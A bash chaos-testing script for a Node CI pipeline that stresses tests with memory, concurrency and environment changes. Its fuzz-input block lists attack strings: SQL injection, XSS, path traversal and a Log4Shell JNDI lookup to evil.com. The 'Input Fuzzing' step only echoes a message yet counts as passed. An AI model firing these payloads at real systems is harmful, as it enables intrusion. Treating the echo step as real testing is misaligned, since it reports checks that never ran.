#!/bin/bash

# Chaos Testing Script for CI/CD Pipeline
# This script performs comprehensive chaos testing to uncover edge cases

set -e

echo "🔥 CHAOS TESTING - Finding edge cases and unexpected behaviors..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

log_test() {
    echo -e "${BLUE}🧪 $1${NC}"
}

log_pass() {
    echo -e "${GREEN}✅ $1${NC}"
    ((PASSED_TESTS++))
}

log_fail() {
    echo -e "${RED}❌ $1${NC}"
    ((FAILED_TESTS++))
}

log_warn() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

run_test() {
    local test_name="$1"
    local test_command="$2"
    
    ((TOTAL_TESTS++))
    log_test "$test_name"
    
    if eval "$test_command" > /tmp/chaos_test_output 2>&1; then
        log_pass "$test_name passed"
    else
        log_fail "$test_name failed"
        cat /tmp/chaos_test_output
    fi
}

# Ensure we're in the right directory
cd "$(dirname "$0")/.."

echo "📍 Running chaos tests from: $(pwd)"

# 1. Standard Chaos Test Suite
log_test "Running comprehensive chaos test suite..."
run_test "Chaos Test Suite" "npm test -- tests/chaos-testing.test.ts"

# 2. Memory Pressure Testing
log_test "Memory pressure testing with limited heap..."
run_test "Memory Pressure" "node --max-old-space-size=256 node_modules/.bin/vitest --run tests/chaos-testing.test.ts"

# 3. Concurrent Load Testing
log_test "Concurrent load testing..."
run_test "Concurrent Load" "
for i in {1..5}; do
  npm test -- tests/chaos-testing.test.ts &
done
wait
"

# 4. Resource Exhaustion Testing
log_test "Testing with many open file descriptors..."
run_test "File Descriptor Limit" "ulimit -n 1024 && npm test -- tests/chaos-testing.test.ts"

# 5. Environment Variable Chaos
log_test "Testing with chaotic environment variables..."
export NODE_ENV="chaos-test-$(date +%s)"
export DEBUG="*"
export LOG_LEVEL="debug"
run_test "Environment Chaos" "npm test -- tests/chaos-testing.test.ts"
unset NODE_ENV DEBUG LOG_LEVEL

# 6. Network Timeout Simulation
log_test "Testing with network timeouts..."
run_test "Network Timeout" "timeout 30s npm test -- tests/chaos-testing.test.ts"

# 7. Database Connection Chaos (if real database tests exist)
if [ -f "tests/real-database-integration.test.ts" ]; then
    log_test "Database connection chaos testing..."
    
    # Test with connection limits
    run_test "DB Connection Limit" "npm test -- tests/real-database-integration.test.ts"
    
    # Test rapid connection/disconnection
    run_test "DB Connection Chaos" "
    for i in {1..3}; do
        npm test -- tests/real-database-integration.test.ts &
        sleep 1
    done
    wait
    "
fi

# 8. Garbage Collection Pressure
log_test "Testing under GC pressure..."
run_test "GC Pressure" "node --expose-gc --max-old-space-size=128 node_modules/.bin/vitest --run tests/chaos-testing.test.ts"

# 9. Random Delay Injection
log_test "Testing with random delays..."
run_test "Random Delays" "
export CHAOS_DELAY=true
npm test -- tests/chaos-testing.test.ts
unset CHAOS_DELAY
"

# 10. Input Fuzzing Test
log_test "Running input fuzzing tests..."
cat > /tmp/fuzz_input.json << 'EOF'
{
  "extreme_strings": [
    "",
    "a",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "🚀💀👾🤖🔥💎⚡🌈🦄🎭",
    "' OR 1=1 --",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/a}",
    "../../etc/passwd",
    "\u0000\u0001\u0002\u0003",
    "SELECT * FROM users; DROP TABLE users;--"
  ],
  "extreme_numbers": [
    0, -0, 1, -1,
    9007199254740991,
    -9007199254740991,
    1.7976931348623157e+308,
    5e-324,
    "Infinity", "-Infinity", "NaN"
  ],
  "extreme_objects": [
    null, {},
    {"a": {"b": {"c": {"d": {"e": {"f": {"g": "deep"}}}}}}},
    {"array": [1,2,3,4,5,6,7,8,9,10]}
  ]
}
EOF

run_test "Input Fuzzing" "echo 'Fuzzing test data created at /tmp/fuzz_input.json'"

# 11. Real-world Scenario Chaos
log_test "Real-world high-load scenario simulation..."
run_test "High Load Scenario" "
# Simulate 10 concurrent users performing various operations
for user in {1..10}; do
(
  for action in {1..5}; do
    npm test -- tests/graph-operations.test.ts > /dev/null 2>&1 &
    sleep 0.1
  done
) &
done
wait
"

# 12. System Resource Monitoring
log_test "Monitoring system resources during test..."
if command -v top >/dev/null 2>&1; then
    run_test "Resource Monitor" "
    # Run tests while monitoring resources
    top -b -n 1 | head -20 > /tmp/system_resources_before.txt
    npm test -- tests/chaos-testing.test.ts > /dev/null 2>&1
    top -b -n 1 | head -20 > /tmp/system_resources_after.txt
    echo 'System resources monitored during chaos testing'
    "
fi

# 13. Error Recovery Testing
log_test "Testing error recovery and resilience..."
run_test "Error Recovery" "
# Introduce intentional failures and test recovery
export CHAOS_MODE=true
npm test -- tests/chaos-testing.test.ts || echo 'Expected some chaos failures'
unset CHAOS_MODE
"

# Clean up
rm -f /tmp/chaos_test_output /tmp/fuzz_input.json /tmp/system_resources_*.txt

# Final Results
echo ""
echo "🎯 CHAOS TESTING RESULTS:"
echo "========================="
echo -e "Total Tests: ${BLUE}$TOTAL_TESTS${NC}"
echo -e "Passed: ${GREEN}$PASSED_TESTS${NC}"
echo -e "Failed: ${RED}$FAILED_TESTS${NC}"

if [ $FAILED_TESTS -eq 0 ]; then
    echo -e "\n${GREEN}🏆 ALL CHAOS TESTS PASSED! System shows excellent resilience.${NC}"
    exit 0
elif [ $FAILED_TESTS -lt 3 ]; then
    echo -e "\n${YELLOW}⚠️  Some chaos tests failed, but system shows good resilience.${NC}"
    exit 0
else
    echo -e "\n${RED}💥 Multiple chaos tests failed. System needs resilience improvements.${NC}"
    exit 1
fi